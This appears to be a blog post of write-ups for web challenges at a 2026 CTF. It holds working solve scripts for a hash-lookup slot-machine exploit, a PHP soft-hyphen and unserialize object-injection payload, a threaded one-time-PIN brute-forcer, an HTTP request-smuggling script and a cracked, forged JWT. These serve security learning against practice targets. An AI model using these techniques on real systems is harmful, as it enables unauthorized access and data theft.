---
layout: post
title:  "Web Challenges"
date:   2026-08-23 15:23:00 -0400
author: uzi
tags: [CTF]
permalink: /brunner-ctf-2026-web/
---
* TOC
{:toc}

## Brunner Mifflin - Complaint Box

**Category**: Forensics

**Difficulty:** Beginner  

**Author:** Emil8250

**Description**: Toby is HR at Brunner Mifflin's Odense branch. He usually reads the complaint before stuffing it into the complaint box. He makes sure to inform everyone that their complaint has been read, filed and archived correctly - but could there be something he isn't telling them?

I go to the site:

![Alt text](/images/brunner2026web1.png)

I made a test request:
```http
POST /API/Complaint HTTP/1.1
Host: brunner-mifflin-complaint-box-96847d1f4c1e78ea-global.challs.brunnerne.xyz
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://brunner-mifflin-complaint-box-96847d1f4c1e78ea-global.challs.brunnerne.xyz/
Content-Type: application/json
Content-Length: 52
Origin: https://brunner-mifflin-complaint-box-96847d1f4c1e78ea-global.challs.brunnerne.xyz
Dnt: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive

{"Author":"test","Offender":"test","Content":"test"}
```

Response:
```shell
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
Date: Fri, 21 Aug 2026 13:11:58 GMT
Server: Kestrel
X-Deployment-Id: brunner-mifflin-complaint-box-96847d1f4c1e78ea-global
X-Team-Id: 306
X-Terminal-Id: global

{"message":"Toby successfully archived the complaint from test about test under his desk","flag":"brunner{C0mpla1nt_f1led}"}
```

`brunner{C0mpla1nt_f1led}`

___

## Apply here

**Category**: Web

**Difficulty:** Beginner 

**Author:** Quack

**Description**: Brunnerne Incorporated is hiring! We are a fast-paced, mission-driven family looking for passionate self-starters to join our journey. So you applied. And then you waited. Estimated response time is 3 to 5 business decades and HR is frankly not reading their inbox. Maybe you should just approve yourself.

I go to the site:

![Alt text](/images/brunner2026web3.png)

I notice there is also a login page at `/admin`.

I created a test application for myself:

![Alt text](/images/brunner2026web4.png)

On `view-source:https://apply-here-ab48db08d759efb3-global.challs.brunnerne.xyz/admin` I found login creds:
```html
<!-- TODO(marketing): remove before go-live!!! Temporary HR credentials while SSO is "being procured": user: hr.admin pass: Synergy2024! - Kevin, Q3 sprint 14 -->
```

Login on `/admin` with `hr.admin:Synergy2024!`:

![Alt text](/images/brunner2026web5.png)

Approve the application:

![Alt text](/images/brunner2026web6.png)

`brunner{l00k_m4_1_f1n411y_g0t_4_j0b!}`

___

## Fair Gambling

**Category**: Web

**Difficulty:** Medium  

**Author:** HLVM

**Description**: Earn a bigger yearly employee bonus at Brunnerne Inc new "fair luck initiative" 🎰

I get the challenge files:
```shell
ls  
compose.yml  Dockerfile  index.html  package.json  server.ts
```

Contents of `server.ts`:
```ts
const FLAG = "brunner{REDACTED}";
const START_CASH = 1000;
const SPIN_COST = 25;
const FLAG_COST = 1_000_000;
const STREAK_MULTIPLIER = 3;
const COOKIE_MAX_AGE = 2_147_483_647;
const PORT = Number(Bun.env.PORT ?? 3000);

type SymbolDef = { emoji: string; weight: number; payout: number };
type User = { cash: number; flagBought: boolean; winStreak: number };
type PreparedSpin = { userid: string; result: string[]; hash: string; win: number };
type SpinRef = { sid: string; hash: string };

const symbols: SymbolDef[] = [
  { emoji: "🍒", weight: 500, payout: 50 },
  { emoji: "🍋", weight: 260, payout: 100 },
  { emoji: "🍇", weight: 130, payout: 250 },
  { emoji: "🍉", weight: 60, payout: 1_000 },
  { emoji: "🔔", weight: 20, payout: 5_000 },
  { emoji: "⭐", weight: 5, payout: 20_000 },
  { emoji: "💎", weight: 25, payout: 100_000 },
];

const users = new Map<string, User>();
const spins = new Map<string, PreparedSpin>();
const html = Bun.file("index.html");

const json = (data: unknown) => JSON.stringify(data);
const send = (ws: ServerWebSocket<{ userid: string }>, data: unknown) => ws.send(json(data));

const id = () => crypto.randomUUID();

function discardPreparedSpins(userid: string) {
  for (const [sid, spin] of spins) {
    if (spin.userid === userid) spins.delete(sid);
  }
}

function getUser(userid: string) {
  let user = users.get(userid);
  if (!user) {
    user = { cash: START_CASH, flagBought: false, winStreak: 0 };
    users.set(userid, user);
  }
  return user;
}

function weightedPick() {
  const total = symbols.reduce((sum, symbol) => sum + symbol.weight, 0);
  let roll = crypto.getRandomValues(new Uint32Array(1))[0] / 2 ** 32 * total;

  for (const symbol of symbols) {
    roll -= symbol.weight;
    if (roll <= 0) return symbol;
  }

  return symbols[0];
}

async function sha1(value: string) {
  const bytes = new TextEncoder().encode(value);
  const hash = await crypto.subtle.digest("SHA-1", bytes);
  return [...new Uint8Array(hash)]
    .map((byte) => byte.toString(16).padStart(2, "0"))
    .join("");
}

async function prepareSpin(userid: string) {
  const result = [weightedPick(), weightedPick(), weightedPick()];
  const emojis = result.map((symbol) => symbol.emoji);
  const win = emojis.every((emoji) => emoji === emojis[0]) ? result[0].payout : 0;
  const sid = id();

  const spin = { userid, result: emojis, win, hash: await sha1(emojis.join("")) };
  spins.set(sid, spin);
  return { sid, hash: spin.hash } satisfies SpinRef;
}

async function spin(ws: ServerWebSocket<{ userid: string }>, sid?: string) {
  const user = getUser(ws.data.userid);
  const current = sid ? spins.get(sid) : undefined;

  if (!current || current.userid !== ws.data.userid) {
    // An invalid SID deliberately discards a prepared result without charging the user.
    discardPreparedSpins(ws.data.userid);
    send(ws, {
      type: "spin",
      status: "discarded",
      message: "Spin expired. Prepared a replacement.",
      next: await prepareSpin(ws.data.userid),
    });
    return;
  }

  if (user.cash < SPIN_COST) {
    send(ws, {
      type: "spin",
      status: "rejected",
      message: "Not enough cash to spin.",
      next: { sid: sid!, hash: current.hash },
    });
    return;
  }

  spins.delete(sid);
  user.cash -= SPIN_COST;
  let win = current.win;
  if (win > 0) {
    user.winStreak++;
    win *= STREAK_MULTIPLIER ** (user.winStreak - 1);
  } else {
    user.winStreak = 0;
  }
  user.cash += win;
  const next = await prepareSpin(ws.data.userid);

  send(ws, {
    type: "spin",
    status: "revealed",
    result: {
      sid,
      symbols: current.result,
      hash: current.hash,
      win,
    },
    cash: user.cash,
    streak: user.winStreak,
    next,
  });
}

function redeem(ws: ServerWebSocket<{ userid: string }>) {
  const user = getUser(ws.data.userid);
  if (user.flagBought) {
    send(ws, { type: "flag", flag: FLAG, cash: user.cash });
    return;
  }

  if (user.cash < FLAG_COST) {
    send(ws, {
      type: "error",
      message: `Redeem costs $${FLAG_COST.toLocaleString()}.`,
    });
    return;
  }

  user.cash -= FLAG_COST;
  user.flagBought = true;
  send(ws, { type: "flag", flag: FLAG, cash: user.cash });
}

Bun.serve<{ userid: string }>({
  port: PORT,
  fetch(req, server) {
    const url = new URL(req.url);
    const cookieUserid = req.headers.get("cookie")?.match(/(?:^|; )userid=([^;]+)/)?.[1];

    if (url.pathname === "/ws") {
      const userid = cookieUserid || id();
      if (server.upgrade(req, { data: { userid } })) return;
      return new Response("WebSocket upgrade failed", { status: 400 });
    }

    if (url.pathname === "/" || url.pathname === "/index.html") {
      const userid = cookieUserid || id();
      getUser(userid);
      return new Response(html, {
        headers: {
          "content-type": "text/html; charset=utf-8",
          "set-cookie": `userid=${userid}; Path=/; Max-Age=${COOKIE_MAX_AGE}; SameSite=Lax`,
        },
      });
    }

    return new Response("Not found", { status: 404 });
  },
  websocket: {
    async open(ws) {
      const user = getUser(ws.data.userid);
      send(ws, {
        type: "state",
        cash: user.cash,
        flagBought: user.flagBought,
        streak: user.winStreak,
        spinCost: SPIN_COST,
        flagCost: FLAG_COST,
        streakMultiplier: STREAK_MULTIPLIER,
        symbols,
        next: await prepareSpin(ws.data.userid),
      });
    },
    message(ws, message) {
      let data: { type?: string; sid?: string };
      try {
        data = JSON.parse(String(message));
      } catch {
        send(ws, { type: "error", message: "Bad message." });
        return;
      }

      if (data.type === "spin") spin(ws, data.sid);
      if (data.type === "redeem") redeem(ws);
    },
  },
});

console.log(`Brunnerne Inc Yearly Bonus Opportunity running at http://localhost:${PORT}`);
```

The server sends the SHA‑1 hash of the spin result before the player commits to paying the spin cost. There is only 343 possible outcomes so it is easy to pre compute them. 

I ran a script which pre computes the SHA‑1 for every combo and builds a lookup table. Then when the server sends a `next` hash, the client looks it up and knows whether the spin wins or loses.

Solve script:
```python
import asyncio
import websockets
import json
import hashlib

SYMBOLS = ["🍒", "🍋", "🍇", "🍉", "🔔", "⭐", "💎"]
HASHES = {}
for a in SYMBOLS:
    for b in SYMBOLS:
        for c in SYMBOLS:
            combo = a+b+c
            h = hashlib.sha1(combo.encode()).hexdigest()
            HASHES[h] = combo

async def exploit():
    uri = "wss://fair-gambling-cfb2d77e9c2e19a6-global.challs.brunnerne.xyz/ws"
    async with websockets.connect(uri) as ws:
        # Initial state
        msg = json.loads(await ws.recv())
        next_spin = msg["next"]
        cash = msg["cash"]

        while cash < 1_000_000:
            h = next_spin["hash"]
            combo = HASHES.get(h)
            if not combo:
                print("Unknown hash???")
                break

            is_win = (combo[0] == combo[1] == combo[2])
            sid_to_send = next_spin["sid"] if is_win else "invalid"

            await ws.send(json.dumps({
                "type": "spin",
                "sid": sid_to_send
            }))

            resp = json.loads(await ws.recv())

            if resp["type"] == "spin":
                status = resp.get("status")
                if status == "discarded":
                    next_spin = resp["next"]
                    continue
                elif status == "revealed":
                    cash = resp["cash"]
                    next_spin = resp["next"]
                    print(f"Cash: {cash}")
                else:
                    print(f"Unexpected spin status: {status}")
                    break
            elif resp["type"] == "error":
                print("Error:", resp["message"])
                break
            else:
                print("Unexpected response:", resp)
                break

        # Redeem the flag
        await ws.send(json.dumps({"type": "redeem"}))
        flag_msg = json.loads(await ws.recv())
        if flag_msg["type"] == "flag":
            print("Flag:", flag_msg["flag"])

asyncio.run(exploit())
```

Output:
```shell
python3 solve.py  
Cash: 1025  
Cash: 1150  
Cash: 1575  
Cash: 2900  
Cash: 10975  
Cash: 23100  
Cash: 59525  
Cash: 168850  
Cash: 496875  
Cash: 1481000  
Flag: brunner{l3ts_g0_g4mbl1ng}
```

`brunner{l3ts_g0_g4mbl1ng}`

___

## PHP 2003

**Category**: Web

**Difficulty:** Medium

**Author:** HLVM

**Description**: The old hosting provider's reservation portal is still online, but its booking system has long since been retired. Can you recover the customer-area flag?

I go to the site:

![Alt text](/images/brunner2026web8.png)

Looking at `robots.txt`:
```shell
curl https://php-2003-239c5aeb5c81ec1a-global.challs.brunnerne.xyz/robots.txt  
User-agent: *  
Disallow: /cgi-bin/  
Disallow: /stats/  
Disallow: /webmail/  
Disallow: /private/  
Disallow: /index.phps
```

Looking at `index.phps`:
```shell
curl https://php-2003-239c5aeb5c81ec1a-global.challs.brunnerne.xyz/index.phps
<?php
declare(strict_types=1);

const ACCESS_CODE_HASH = '0e769468064680399918991535722650';

final class Voucher
{
    public function __toString(): string
    {
        return getenv('WEBHOTEL_LICENSE_KEY') ?: 'brunner{REDACTED}';
    }
}

final class Receipt
{
    public bool $flushOnShutdown = false;
    public mixed $voucher = null;

    public function __destruct()
    {
        if ($this->flushOnShutdown && $this->voucher instanceof Voucher) {
            $flag = htmlspecialchars((string) $this->voucher, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
            echo '<div class="result flag">' . $flag . '</div>';
        }
    }
}

final class Booking
{
    public string $user = '';
    public string $role = 'guest';
    public mixed $receipt = null;
}

function legacy_cgi_request(): bool
{
    $raw = $_SERVER['QUERY_STRING'] ?? '';
    $decoded = urldecode($raw);

    if (str_contains($decoded, '-')) {
        return false;
    }

    $normalized = str_replace("\u{00AD}", '-', $decoded);
    return trim($normalized) === '-d webhotel.legacy=1';
}

function first_serialized_string(string $serialized, string $property): ?string
{
    $name = preg_quote($property, '/');
    $pattern = '/s:' . strlen($property) . ':"' . $name . '";s:(\d+):"(.*?)";/s';

    if (!preg_match($pattern, $serialized, $match)) {
        return null;
    }

    return strlen($match[2]) === (int) $match[1] ? $match[2] : null;
}

$message = '';
$messageClass = 'error';
$destroyBooking = null;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $staffPin = (string) ($_POST['staff_pin'] ?? '');
    $encodedReservation = (string) ($_POST['reservation_export'] ?? '');
    $reservation = base64_decode($encodedReservation, true);

    if (!legacy_cgi_request()) {
        $message = 'The reservation service is unavailable.';
    } elseif (md5($staffPin) != ACCESS_CODE_HASH) {
        $message = 'Recovery code rejected.';
    } elseif ($reservation === false) {
        $message = 'Reservation export rejected.';
    } elseif (first_serialized_string($reservation, 'role') !== 'guest') {
        $message = 'Only customer reservations can be imported.';
    } else {
        $booking = @unserialize($reservation, [
            'allowed_classes' => [Booking::class, Receipt::class, Voucher::class],
        ]);

        if (!$booking instanceof Booking) {
            $message = 'Reservation export could not be read.';
        } elseif ($booking->role !== 'admin') {
            $message = 'A staff reservation is required.';
        } elseif (!$booking->receipt instanceof Receipt) {
            $message = 'Receipt missing from reservation export.';
        } else {
            $booking->receipt->flushOnShutdown = true;
            $destroyBooking = $booking;
            $message = 'Reservation imported.';
            $messageClass = 'ok';
        }
    }
}
?>
<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Brunnerne Hosting · Customer Area</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
<table class="shell" role="presentation">
    <tr><td class="titlebar">BRUNNERNE HOSTING</td></tr>
    <tr><td class="nav">Home&nbsp; | &nbsp;Customers&nbsp; | &nbsp;Webmail&nbsp; | &nbsp;Support</td></tr>
    <tr><td class="content">
        <div class="panel">
            <div class="panel-title">Reservation import</div>
            <p class="intro">The original booking system is no longer in service. Staff can restore a customer reservation from an exported booking file.</p>
            <form method="post">
                <label>Staff recovery code</label>
                <input name="staff_pin" autocomplete="off">

                <label>Reservation export</label>
                <textarea name="reservation_export" rows="7" spellcheck="false"></textarea>

                <button type="submit">Import reservation</button>
            </form>
            <?php if ($message !== ''): ?>
                <div class="result <?= $messageClass ?>"><?= htmlspecialchars($message, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') ?></div>
            <?php endif; ?>
            <?php
            if ($destroyBooking !== null) {
                unset($destroyBooking);
                unset($booking);
            }
            ?>
        </div>
    </td></tr>
    <tr><td class="footer">Brunnerne Hosting ApS · Customer services · Portal build 2003.11</td></tr>
</table>
</body>
</html>
```

4 key parts work together for this exploit. The `legacy_cgi_request()` function converts soft hyphens (`\u{00AD}`) to real hyphens. By using `%C2%AD` in the query string you can turn `%C2%ADd%20webhotel.legacy=1` into `-d webhotel.legacy=1` after replacement, bypassing the `str_contains('-')` check. This makes the portal think its a valid CGI request.

The staff pin is compared with `md5($staffPin) != ACCESS_CODE_HASH`. The hash is `0e769468...` which PHP interprets as `0.0` in loose comparison. The input `240610708` hashes to `0e462097...` also `0.0`, so the condition passes. Weird. 

`unserialize()` uses `allowed_classes` to permit `Booking`, `Receipt`, `Voucher`. The serialized string has two `role` properties: first `"guest"`, then `"admin"`. PHP deserializes them in order so the last one (admin) overwrites the first.

After `unserialize()` the code sets `$booking->receipt->flushOnShutdown = true` and stores the whole object in `$destroyBooking`. At the end of the script `unset($destroyBooking)` triggers `Receipt::__destruct()`. That checks `flushOnShutdown` and `voucher instanceof Voucher` then casts `$voucher` to string. `Voucher::__toString()` returns the environment variable `WEBHOTEL_LICENSE_KEY`.

Python exploit:
```python
python3  
Python 3.13.5 (main, Jul 15 2026, 20:25:40) [GCC 14.2.0] on linux  
Type "help", "copyright", "credits" or "license" for more information.  
>>> import requests  
... import base64  
...  
... url = "https://php-2003-239c5aeb5c81ec1a-global.challs.brunnerne.xyz/?%C2%ADd%20webhotel.legacy=1"  
...  
... serialized = b'O:7:"Booking":4:{s:4:"user";s:0:"";s:4:"role";s:5:"guest";s:4:"role";s:5:"admin";s:7:"receipt";O:7:"Receipt":2:{s:15:"flushOnShutdown";b:0;s:7:"voucher";O:\7:"Voucher":0:{}}}'  
... b64 = base64.b64encode(serialized).decode()  
...  
... data = {  
...     'staff_pin': '240610708',
...     'reservation_export': b64  
... }  
...  
... r = requests.post(url, data=data)  
... print(r.text)  
...
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Brunnerne Hosting · Customer Area</title>
    <link rel="stylesheet" href="style.css">
  </head>
  <body>
    <table class="shell" role="presentation">
      <tr>
        <td class="titlebar">BRUNNERNE HOSTING</td>
      </tr>
      <tr>
        <td class="nav">Home&nbsp; | &nbsp;Customers&nbsp; | &nbsp;Webmail&nbsp; | &nbsp;Support</td>
      </tr>
      <tr>
        <td class="content">
          <div class="panel">
            <div class="panel-title">Reservation import</div>
            <p class="intro">The original booking system is no longer in service. Staff can restore a customer reservation from an exported booking file.</p>
            <form method="post"><label>Staff recovery code</label><input name="staff_pin" autocomplete="off"><label>Reservation export</label><textarea name="reservation_export" rows="7" spellcheck="false"></textarea><button type="submit">Import reservation</button></form>
            <div class="result ok">Reservation imported.</div>
            <div class="result flag">brunner{php_was_a_web_framework_and_a_fever_dream}</div>
          </div>
        </td>
      </tr>
      <tr>
        <td class="footer">Brunnerne Hosting ApS · Customer services · Portal build 2003.11</td>
      </tr>
    </table>
  </body>
</html>
```
Fever dream is right.

`brunner{php_was_a_web_framework_and_a_fever_dream}`

___

## Dumb-factor Authentication

**Category**: Web

**Difficulty:** Medium

**Author:** Brunnerne Security Team

**Description**: Welcome to the **Brunnerne HR Portal**!

To ensure "state-of-the-art" passwordless security, our IT team rolled out a passwordless **Dumb-Factor Authentication** login page using a custom, high-speed TOTP verification cache.

Unfortunately, the rollout has been a complete disaster:

- The security team abruptly resigned after auditing the authentication mechanism.
- Kjell turned on a military-grade degausser, wiping all offline backups.
- Emilie was found eating the incident report sticky notes to prevent "unauthorized data leakage."
- Klaus is refusing to sign off on security clearances until developers pitch pull requests to his "Chief Duck Officer" rubber duck.

Before leaving, the security team managed to store their final audit report in a private HR feedback ticket.

Can you bypass the dumb-factor authentication portal, escalate your privileges to the `admin` account, and recover the audit flag?

_No source code is provided for this challenge. You must analyze the live application behavior to find the flaw._

I go to the site. There are 4 posts on the main page. Two are visible and two are not:

![Alt text](/images/brunner2026web11.png)

I see they mention having 1,000 registered users!

On `robots.txt`:
```shell
curl https://dumb-factor-authentication-0e43e8b6cff2f5f0-global.challs.brunnerne.xyz/robots.txt  
User-agent: *  
Disallow: /feedback/view?id=
```

There is no username/password to login. They use a 6 digit one time password. On `/login`:

![Alt text](/images/brunner2026web12.png)

I tested the portal and there was no rate limiting. With 6 digits, there is one million possible combinations. With 1,000 active users, I should only need to guess ~1,000 times. 

I ran this script:
```python
import requests
import concurrent.futures
import random

BASE = "https://dumb-factor-authentication-0e43e8b6cff2f5f0-global.challs.brunnerne.xyz"
found = {"pin": None, "cookies": None}

def try_pin(pin):
    if found["pin"]:
        return None
    r = requests.post(f"{BASE}/login", data={"pin": f"{pin:06d}"}, allow_redirects=False)
    if r.status_code == 302 and r.headers.get("Location", "") != "/login":
        return (pin, r)
    return None

# find a valid pin
pins = random.sample(range(1000000), 5000)
with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
    futures = {ex.submit(try_pin, p): p for p in pins}
    for f in concurrent.futures.as_completed(futures):
        result = f.result()
        if result:
            pin, resp = result
            found["pin"] = pin
            found["cookies"] = resp.cookies
            print(f"    Valid PIN: {pin:06d}")
            print(f"    Redirect to: {resp.headers.get('Location')}")
            print(f"    Cookies: {dict(resp.cookies)}")
            break

if not found["pin"]:
    print("No valid PIN found in 5000 tries, cry")
else:
    print("\nnothing")
```

I get a login in about 20 seconds:
```python
python3 login_totp.py  
Valid PIN: 224463  
Redirect to: /  
Cookies: {'session': 'MTc4NzM1MzYxMXxEWDhFQVFMX2dBQUJFQUVRQUFCTl80QUFBZ1p6ZEhKcGJtY01DUUFIZFhObGNsOXBaQU5wYm5RRUJBRC1BNFlHYzNSeWFXNW5EQW9BQ0hWelpYSnVZVzFsQm5OMGNtbHVad3dSQUE5d2NtOTRlVjl1YVc1cVlWODBORGs9fHJvBootWsLqqYVpMvAKGYxn2NiPgkdObFcJL0699ErL'}
```
Nice!

I login:

![Alt text](/images/brunner2026web13.png)

I get access to a random account. All posts on the main page are now visible. They mention that they had some issues related to username collisions... 

I went to `/settings` where I first updated my username to `admin`. Nothing was stopping me from doing that:

![Alt text](/images/brunner2026web14.png)

Then I clicked `Reset Key`:

![Alt text](/images/brunner2026web15.png)

I scanned the QR code and got this:
```shell
OTP:
- Authentication Type: totp
- Account Label: BrunnerneHR:admin
Secret Key: EDO37KT5NPX4YSJJ
- Service: BrunnerneHR
otpauth://totp/BrunnerneHR:admin?secret=EDO37KT5NPX4YSJJ&issuer=BrunnerneHR
```

I had to quickly run this python to generate a new TOTP for the admin account:
```python
ython3  
Python 3.13.5 (main, Jul 15 2026, 20:25:40) [GCC 14.2.0] on linux  
Type "help", "copyright", "credits" or "license" for more information.  
>>> import pyotp, requests  
...  
... BASE = "https://dumb-factor-authentication-0e43e8b6cff2f5f0-global.challs.brunnerne.xyz"  
... secret = "EDO37KT5NPX4YSJJ"
...  
... totp = pyotp.TOTP(secret)  
... pin = totp.now()  
... print(f"Current admin PIN: {pin}")  
...  
... s = requests.Session()  
... r = s.post(f"{BASE}/login", data={"pin": pin}, allow_redirects=False)  
... print(f"Login: {r.status_code} -> {r.headers.get('Location', '')}")  
...  
Current admin PIN: 533658
Login: 302 -> /
```

Without logging back in with the new admin pin the feedback pages would show:
```shell
Access Forbidden: Only the 'admin' account is authorized to view employee feedback.
```

I log back with with this pin and I am able to access all of the feedback! The flag was found on `https://dumb-factor-authentication-0e43e8b6cff2f5f0-global.challs.brunnerne.xyz/feedback/view?id=24`:

![Alt text](/images/brunner2026web10.png)

`brunner{ch1ef_duck_0ff1c3r_4ppr0v3d_th1s_fl4g}`

___

## Welcome Aboard

**Category**: Web

**Difficulty:** Medium

**Author:** Budji

**Description**: Your employee account has access to the Brunnerne Inc. Wiki, where you'll find onboarding guides and technical documentation. The platform sits behind multiple layers of infrastructure, and IT is confident every chunk reaches the backend, exactly as expected. Explore the wiki and see if everything behaves as intended.

**NOTE:** On challenge start, if you get a 404 error or similar, please try again in 30-60 seconds. The challenge has connection issues in Safari. Please use another browser like Firefox or a Chromium-based.

I go to the site:

![Alt text](/images/brunner2026web16.png)

When I tried to proxy the site with burpsuite I got this error: `Stream failed to close correctly`

I tried a `curl` command and got this:
```shell
curl -k 'https://welcome-aboard-cb2eb3a6b2e2aed7-global.challs.brunnerne.xyz:1337/' -H 'Transfer-Encoding: chunked' -H 'Content-Type: application/x-www-form-urlencoded' -d $'8\r\nq=test\r\n0\r\n\r\n'  
curl: (16) Remote peer returned unexpected data while we expected SETTINGS frame.  Perhaps, peer does not support HTTP/2 properly.
```

I started to think this is a request smuggling challenge. On `https://welcome-aboard-cb2eb3a6b2e2aed7-global.challs.brunnerne.xyz:1337/robots.txt`:
```html
User-agent: *
Disallow: /wiki/internal/flag
```

On `/wiki/internal/flag`:
```html
Access is forbidden.
```

I started by testing for typical smuggling vulnerabilities where the request includes both `Content-Length` and `Transfer-Encoding: chunked` headers. 

The front end (reverse proxy) uses `Content‑Length`  to read exactly `len(body)` bytes from the POST body and forwards that whole chunk to the back end. It does not inspect the content inside the body. 

The back end (Kestrel) prioritises `Transfer‑Encoding` and parses the chunked body, stops at a `0\r\n\r\n` terminator, and treats the remaining bytes (`GET /wiki/internal/flag ...`) as a second HTTP request pipelined on the same connection. I get the POST response and the flag response in one request.

Solve:
```python
import socket
import ssl
import time

HOST = "welcome-aboard-cb2eb3a6b2e2aed7-global.challs.brunnerne.xyz"
PORT = 1337

body = (
    b"0\r\n"
    b"\r\n"
    b"GET /wiki/internal/flag HTTP/1.1\r\n"
    b"Host: " + HOST.encode() + b":" + str(PORT).encode() + b"\r\n"
    b"\r\n"
)

# get proper Content-Length
content_length = str(len(body)).encode()

request = (
    b"POST /search HTTP/1.1\r\n"
    b"Host: " + HOST.encode() + b":" + str(PORT).encode() + b"\r\n"
    b"Content-Length: " + content_length + b"\r\n"
    b"Transfer-Encoding: chunked\r\n"
    b"Content-Type: application/x-www-form-urlencoded\r\n"
    b"\r\n"
) + body

# connect & send req
ctx = ssl.create_default_context()
sock = socket.create_connection((HOST, PORT))
s = ctx.wrap_socket(sock, server_hostname=HOST)
s.send(request)

response = b""
while True:
    try:
        chunk = s.recv(4096)
        if not chunk:
            break
        response += chunk
        if b"brunner{" in response:
            break
    except:
        break

print(response.decode(errors="ignore"))
s.close()
```

Output:
```shell
python3 smuggle.py  
HTTP/1.1 200 OK  
Content-Length: 3299  
Content-Type: text/html  
Date: Sat, 22 Aug 2026 00:29:08 GMT  
Server: Kestrel  
  
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Search Results | Brunnerne Inc. Wiki</title>
    <style>
      style stuff
    </style>
  </head>undefined<body>undefined<header>
      <div class="header-top">
        <a class="brand" href="/">Brunnerne Inc.</a>
      </div>
      <div class="search-wrap">
        <form class="search-hero" method="post" action="/search">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2">
            <circle cx="11" cy="11" r="7" />
            <line x1="21" y1="21" x2="16.65" y2="16.65" />
          </svg>
          <input type="text" name="q" placeholder="Search for answers...&hellip;">
        </form>
      </div>
    </header>
    <div class="breadcrumb">Help Center / Search Results</div>
    <main class="card">
      <h1>Search Results</h1>
      <p>0 result(s) for &ldquo;&rdquo;</p>
      <ul class="article-list">
        <li>No matching articles.</li>
      </ul>
      <a class="back-link" href="/">&larr; Back to wiki</a>
    </main>
    <footer>Brunnerne Inc. internal knowledge base</footer>undefined
  </body>undefined
</html>

HTTP/1.1 200 OK  
Content-Length: 3453  
Content-Type: text/html  
Date: Sat, 22 Aug 2026 00:29:08 GMT  
Server: Kestrel  
  
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Q4 Payroll Notes (Internal) | Brunnerne Inc. Wiki</title>
    <style>
      style stuff
    </style>
  </head>
  <body>
    <header>
      <div class="header-top"><a class="brand" href="/">Brunnerne Inc.</a></div>
      <div class="search-wrap">
        <form class="search-hero" method="post" action="/search"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2">
            <circle cx="11" cy="11" r="7" />
            <line x1="21" y1="21" x2="16.65" y2="16.65" />
          </svg><input type="text" name="q" placeholder="Search for answers...&hellip;"></form>
      </div>
    </header>
    <div class="breadcrumb">Help Center / Q4 Payroll Notes (Internal)</div>
    <main class="card">
      <h1>Q4 Payroll Notes (Internal)</h1>
      <div class="byline"><span class="avatar">HR</span><span>Written by HR</span></div>
      <p>These notes are for the payroll team only and are not linked from the public wiki. Flag: brunner{00ps_th4t_p4g3_w4s_1nt3rn4l}</p><a class="back-link" href="/">&larr; Back to wiki</a>
    </main>
    <footer>Brunnerne Inc. internal knowledge base</footer>
```

`brunner{00ps_th4t_p4g3_w4s_1nt3rn4l}`

___

## Secret Event

**Category**: Web

**Difficulty:** Easy

**Author:** HLVM

**Description**: You can't just make stuff up

I go to the site:

![Alt text](/images/brunner2026web18.png)

I registered an account and logged in. Once I login I am on `/dashboard`:

![Alt text](/images/brunner2026web19.png)

I dont have access to `/admin`. When I logged in I got this jwt:
```shell
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1emkiLCJuYW1lIjoidXppIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3ODczNjA4NzgwNTJ9.S1W5EIhQkoBUpPBlbieiA7ZgMzyvltHyxMWrRrkl1vA
```

I cracked the secret:
```shell
john --word=/usr/share/wordlists/rockyou.txt jwt  
Using default input encoding: UTF-8  
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])  
Will run 2 OpenMP threads  
Press 'q' or Ctrl-C to abort, almost any other key for status  
secret           (?)  
1g 0:00:00:00 DONE (2026-08-21 21:11) 1.063g/s 4357p/s 4357c/s 4357C/s 123456..bigman  
Use the "--show" option to display all of the cracked passwords reliably  
Session completed.
```

On [https://www.jwt.io/](https://www.jwt.io/) I forged a jwt to look like this:
```shell
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "sub": "uzi",
  "name": "uzi",
  "role": "admin",
  "iat": 1787360878052
}
```

I went back to the site, replaced my jwt, and went to `/admin`. This image was on the site (it was actually a crazy map of single points and you could only see the flag from one angle):

![Alt text](/images/brunner2026web17.png)

`brunner{well_known_secret}`
